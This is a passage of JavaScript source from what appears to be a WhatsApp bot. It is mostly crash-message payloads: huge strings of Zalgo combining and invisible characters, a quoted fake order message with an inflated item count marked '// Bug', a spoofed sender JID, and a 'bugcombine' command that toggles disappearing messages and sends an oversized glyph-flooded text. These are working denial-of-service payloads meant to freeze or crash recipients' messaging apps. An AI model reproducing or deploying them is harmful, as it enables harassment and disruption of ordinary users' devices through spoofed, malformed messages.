̧̘̟̟͈͍̦̟͈̤ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ',
    orderTitle: 'fake', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
        case 'bugcombine':
if (!dev.key.fromMe && !isOwner) return
                 zoe.toggleDisappearingMessages(from, 'wokwok')
zoe.sendMessage(from, `ஓঔ🛡⇝͜͡✪𝕷𝖔𝖗𝖉\x20𝕬𝖗𝖎𝖋𝖎🦅\x20͜͡✪*\x0a*~*.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ